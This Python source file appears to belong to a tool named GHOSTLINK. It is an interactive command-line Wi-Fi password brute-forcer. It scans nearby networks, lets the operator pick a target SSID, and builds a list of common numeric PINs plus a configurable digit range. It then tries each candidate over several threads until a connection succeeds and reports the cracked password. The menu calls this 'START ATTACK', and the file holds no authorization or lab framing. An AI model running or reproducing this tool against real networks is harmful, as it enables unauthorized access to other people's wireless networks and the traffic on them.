#!/usr/bin/env python3
"""
GHOSTLINK – Interactive Numeric Range Tester
=============================================
Scan networks, pick a target, set range & digits, then brute‑force.
"""

import os
import sys
import time
import threading
from pathlib import Path

# Add parent directory so ghostlink can be imported
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from ghostlink.network.scanner import WiFiScanner
from ghostlink.network.connector import WiFiConnector
from ghostlink.core.colors import C
from ghostlink.core.utils import is_admin, clear_terminal

# ── Common 8‑digit passwords ──────────────────────────
COMMON_8DIGIT = [
    "12345678", "11111111", "00000000", "22222222", "33333333",
    "44444444", "55555555", "66666666", "77777777", "88888888",
    "99999999", "01234567", "87654321", "13579246", "24681357",
    "11223344", "12121212", "12341234", "43214321", "10203040",
    "98765432", "31415926", "27182818", "01012000", "01012024",
    "31121999", "24041990", "15081947",
]

def format_number(num: int, digits: int) -> str:
    return str(num).zfill(digits)

def worker(ssid, timeout, passwords, stop_event, result_holder, lock):
    connector = WiFiConnector()
    for pwd in passwords:
        if stop_event.is_set():
            return
        with lock:
            if result_holder["found"]:
                return
        print(f"{C.GHOST_CYAN}[*] Trying: {pwd}{C.RESET}", end="\r")
        if connector.connect(ssid, pwd, timeout=timeout):
            with lock:
                result_holder["found"] = pwd
                stop_event.set()
            return

def main():
    if not is_admin():
        print(f"{C.RED}[!] Administrator privileges required. Please run as Admin.{C.RESET}")
        sys.exit(1)

    scanner = WiFiScanner()
    config = {
        "ssid": None,
        "start": 0,
        "end": 9999,
        "digits": 4,
        "use_common": True,
        "threads": 2,
        "timeout": 8,
    }

    while True:
        clear_terminal()
        print(f"{C.GHOST_CYAN}{C.BOLD}")
        print(f"  ╔══════════════════════════════════════════════╗")
        print(f"  ║   GHOSTLINK – Numeric Range Tester (CLI)    ║")
        print(f"  ╚══════════════════════════════════════════════╝")
        print(f"{C.RESET}")

        print(f"  {C.BOLD}Current Settings:{C.RESET}")
        print(f"    SSID      : {config['ssid'] or C.DIM + 'Not selected' + C.RESET}")
        print(f"    Range     : {format_number(config['start'], config['digits'])} → {format_number(config['end'], config['digits'])}")
        print(f"    Digits    : {config['digits']} (zero‑padded)")
        print(f"    Common    : {'Yes' if config['use_common'] else 'No'}")
        print(f"    Threads   : {config['threads']}")
        print(f"    Timeout   : {config['timeout']}s")
        print(f"    Total     : {C.BOLD}{(config['end'] - config['start'] + 1) + (len(COMMON_8DIGIT) if config['use_common'] else 0)}{C.RESET} attempts\n")

        print(f"  {C.GREEN}1){C.RESET} Scan & Select Network")
        print(f"  {C.GREEN}2){C.RESET} Set Range (start/end)")
        print(f"  {C.GREEN}3){C.RESET} Set Digit Length")
        print(f"  {C.GREEN}4){C.RESET} Toggle Common PINs")
        print(f"  {C.GREEN}5){C.RESET} Set Threads & Timeout")
        print(f"  {C.GREEN}6){C.RESET} {C.BOLD}START ATTACK{C.RESET}")
        print(f"  {C.GREEN}7){C.RESET} Exit")

        choice = input(f"\n  {C.GHOST_CYAN}GHOSTLINK > {C.RESET}").strip()

        if choice == "1":
            print(f"\n{C.CYAN}[*] Scanning networks...{C.RESET}")
            networks = scanner.scan()
            if not networks:
                print(f"{C.YELLOW}[!] No networks found.{C.RESET}")
                input("Press Enter...")
                continue

            print(f"\n{C.GREEN}[+] Found {len(networks)} networks:{C.RESET}\n")
            for i, net in enumerate(networks, 1):
                bars = "█" * (net.signal // 10) + "░" * (10 - net.signal // 10)
                color = C.GREEN if net.signal > 70 else C.YELLOW if net.signal > 30 else C.RED
                print(f"  {i:<4} {net.ssid:<30} {color}{bars}{C.RESET} {net.signal:>3}%  {net.security}")

            try:
                sel = int(input(f"\n{C.CYAN}Select # (0 to cancel): {C.RESET}").strip())
                if 1 <= sel <= len(networks):
                    config["ssid"] = networks[sel-1].ssid
                    print(f"{C.GREEN}[+] Target: {config['ssid']}{C.RESET}")
            except ValueError:
                pass
            input("Press Enter...")

        elif choice == "2":
            print(f"\n{C.BOLD}Range Configuration{C.RESET}")
            try:
                s = input(f"{C.CYAN}Start [{config['start']}]: {C.RESET}").strip()
                if s:
                    config["start"] = int(s)
                e = input(f"{C.CYAN}End [{config['end']}]: {C.RESET}").strip()
                if e:
                    config["end"] = int(e)
                if config["start"] > config["end"]:
                    print(f"{C.YELLOW}[!] Start must be ≤ end. Swapped.{C.RESET}")
                    config["start"], config["end"] = config["end"], config["start"]
            except ValueError:
                print(f"{C.YELLOW}[!] Invalid numbers.{C.RESET}")
            input("Press Enter...")

        elif choice == "3":
            try:
                d = input(f"{C.CYAN}Digit length [{config['digits']}]: {C.RESET}").strip()
                if d:
                    config["digits"] = int(d)
                    if config["digits"] < 1:
                        config["digits"] = 1
            except ValueError:
                print(f"{C.YELLOW}[!] Invalid number.{C.RESET}")
            input("Press Enter...")

        elif choice == "4":
            config["use_common"] = not config["use_common"]
            print(f"{C.GREEN}[+] Common PINs: {'ON' if config['use_common'] else 'OFF'}{C.RESET}")
            time.sleep(0.5)

        elif choice == "5":
            try:
                t = input(f"{C.CYAN}Threads (1-8) [{config['threads']}]: {C.RESET}").strip()
                if t:
                    config["threads"] = max(1, min(8, int(t)))
                to = input(f"{C.CYAN}Timeout seconds (3-30) [{config['timeout']}]: {C.RESET}").strip()
                if to:
                    config["timeout"] = max(3, min(30, int(to)))
            except ValueError:
                pass
            input("Press Enter...")

        elif choice == "6":
            if not config["ssid"]:
                print(f"{C.RED}[!] No SSID selected.{C.RESET}")
                input("Press Enter...")
                continue

            # Build final password list
            passwords = []
            if config["use_common"]:
                # Filter only numeric, correct length
                common = [p for p in COMMON_8DIGIT if p.isdigit() and len(p) == config["digits"]]
                passwords.extend(common)

            total_range = config["end"] - config["start"] + 1
            if total_range > 0:
                range_passwords = [format_number(i, config["digits"]) for i in range(config["start"], config["end"] + 1)]
                passwords.extend(range_passwords)

            # Remove duplicates
            seen = set()
            unique = []
            for p in passwords:
                if p not in seen:
                    unique.append(p)
                    seen.add(p)
            passwords = unique

            if not passwords:
                print(f"{C.YELLOW}[!] No passwords to test.{C.RESET}")
                input("Press Enter...")
                continue

            print(f"\n{C.BOLD}Attack Summary:{C.RESET}")
            print(f"  Target   : {config['ssid']}")
            print(f"  Attempts : {len(passwords)}")
            print(f"  Threads  : {config['threads']}")
            confirm = input(f"\n{C.GREEN}Start? [y/N]: {C.RESET}").strip().lower()
            if confirm != 'y':
                continue

            # Launch attack
            stop_event = threading.Event()
            result_holder = {"found": None}
            lock = threading.Lock()

            chunk_size = len(passwords) // config["threads"] + 1
            chunks = [passwords[i:i+chunk_size] for i in range(0, len(passwords), chunk_size)]

            threads_list = []
            start_time = time.time()
            print(f"\n{C.CYAN}[+] Starting...{C.RESET}\n")
            for chunk in chunks:
                t = threading.Thread(target=worker, args=(
                    config["ssid"], config["timeout"], chunk, stop_event, result_holder, lock
                ))
                t.daemon = True
                t.start()
                threads_list.append(t)

            try:
                while any(t.is_alive() for t in threads_list):
                    time.sleep(0.5)
                    if stop_event.is_set():
                        break
            except KeyboardInterrupt:
                print(f"\n{C.YELLOW}[!] Interrupted{C.RESET}")
                stop_event.set()

            elapsed = time.time() - start_time
            print()
            if result_holder["found"]:
                print(f"{C.GREEN}{'='*50}{C.RESET}")
                print(f"{C.GREEN}  ✅ PASSWORD FOUND{C.RESET}")
                print(f"{C.GREEN}{'='*50}{C.RESET}")
                print(f"  SSID      : {config['ssid']}")
                print(f"  Password  : {C.GREEN}{result_holder['found']}{C.RESET}")
                print(f"  Time      : {elapsed:.2f}s")
            else:
                print(f"{C.RED}{'='*50}{C.RESET}")
                print(f"{C.RED}  ❌ Not found{C.RESET}")
                print(f"{C.RED}{'='*50}{C.RESET}")

            input("\nPress Enter to return to menu...")

        elif choice == "7":
            print(f"\n{C.GHOST_CYAN}Goodbye!{C.RESET}")
            sys.exit(0)

if __name__ == "__main__":
    main()